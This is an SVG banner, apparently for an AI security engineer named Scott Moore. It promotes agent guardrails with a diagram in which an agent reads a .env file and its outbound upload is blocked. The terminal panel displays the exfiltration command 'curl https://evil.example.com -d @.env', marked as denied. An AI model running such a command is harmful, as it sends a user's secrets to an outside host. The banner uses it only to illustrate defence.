<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="320" viewBox="0 0 1200 320" role="img" aria-label="Scott Moore, AI security engineer. A secret read followed by an outbound call is denied.">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#0d1117"/><stop offset="1" stop-color="#161b22"/>
    </linearGradient>
    <linearGradient id="accent" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0" stop-color="#58a6ff"/><stop offset="1" stop-color="#bc8cff"/>
    </linearGradient>
    <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
      <path d="M40 0H0V40" fill="none" stroke="#30363d" stroke-width="0.5" opacity="0.5"/>
    </pattern>
    <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto">
      <path d="M0 0L8 4L0 8z" fill="#8b949e"/>
    </marker>
  </defs>
  <rect width="1200" height="320" rx="14" fill="url(#bg)"/>
  <rect width="1200" height="320" rx="14" fill="url(#grid)"/>
  <rect x="0" y="0" width="6" height="320" fill="url(#accent)"/>

  <text x="56" y="128" font-family="-apple-system,Segoe UI,Helvetica,Arial,sans-serif" font-size="58" font-weight="700" fill="#f0f6fc">Scott Moore</text>
  <text x="58" y="172" font-family="-apple-system,Segoe UI,Helvetica,Arial,sans-serif" font-size="24" fill="url(#accent)" font-weight="600">AI security engineer</text>
  <text x="58" y="212" font-family="-apple-system,Segoe UI,Helvetica,Arial,sans-serif" font-size="17" fill="#8b949e">Guardrails for agents that can act.</text>
  <text x="58" y="238" font-family="-apple-system,Segoe UI,Helvetica,Arial,sans-serif" font-size="17" fill="#8b949e">Audits for the data layers they sit on.</text>

  <!-- flow diagram -->
  <g font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace" font-size="15">
    <rect x="640" y="70" width="170" height="46" rx="8" fill="#21262d" stroke="#30363d"/>
    <text x="725" y="99" text-anchor="middle" fill="#e3b341">read .env</text>
    <text x="725" y="62" text-anchor="middle" fill="#8b949e" font-size="12">1 · session labeled SECRET</text>

    <path d="M810 93 H860" stroke="#8b949e" stroke-width="1.5" marker-end="url(#arr)"/>

    <rect x="866" y="70" width="140" height="46" rx="8" fill="#21262d" stroke="#30363d"/>
    <text x="936" y="99" text-anchor="middle" fill="#79c0ff">AI agent</text>

    <path d="M1006 93 H1040" stroke="#8b949e" stroke-width="1.5" marker-end="url(#arr)"/>
    <rect x="1046" y="70" width="110" height="46" rx="8" fill="#21262d" stroke="#30363d"/>
    <text x="1101" y="99" text-anchor="middle" fill="#8b949e">sir</text>

    <rect x="640" y="170" width="516" height="92" rx="10" fill="#0d1117" stroke="#30363d"/>
    <circle cx="662" cy="190" r="5" fill="#ff5f56"/><circle cx="680" cy="190" r="5" fill="#ffbd2e"/><circle cx="698" cy="190" r="5" fill="#27c93f"/>
    <text x="660" y="220" fill="#8b949e">$ curl https://evil.example.com -d @.env</text>
    <text x="660" y="246" fill="#ff7b72">× deny</text>
    <text x="716" y="246" fill="#8b949e">secret read at 14:39. No data left your machine.</text>
  </g>
</svg>
